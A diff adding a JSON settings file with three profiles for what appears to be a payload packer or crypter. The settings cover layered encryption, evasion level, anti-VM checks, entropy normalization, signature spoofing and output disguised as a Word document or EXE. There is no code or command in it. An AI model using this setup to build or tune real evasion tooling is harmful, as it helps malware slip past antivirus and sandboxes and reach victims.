@@ -1,0 +1,31 @@
+{
+    "profiles": {
+        "stealth": {
+            "encryption_method": "Triple Layer",
+            "evasion_level": "Maximum",
+            "compression": "LZMA",
+            "target_format": "Word Document",
+            "antivm_enabled": true,
+            "entropy_normalization": true,
+            "signature_spoofing": true
+        },
+        "fast": {
+            "encryption_method": "AES-GCM",
+            "evasion_level": "Basic", 
+            "compression": "zlib",
+            "target_format": "Standalone EXE",
+            "antivm_enabled": false,
+            "entropy_normalization": false,
+            "signature_spoofing": false
+        },
+        "balanced": {
+            "encryption_method": "AES-CBC+XOR",
+            "evasion_level": "High",
+            "compression": "LZMA",
+            "target_format": "Word Document",
+            "antivm_enabled": true,
+            "entropy_normalization": true,
+            "signature_spoofing": false
+        }
+    }
+}
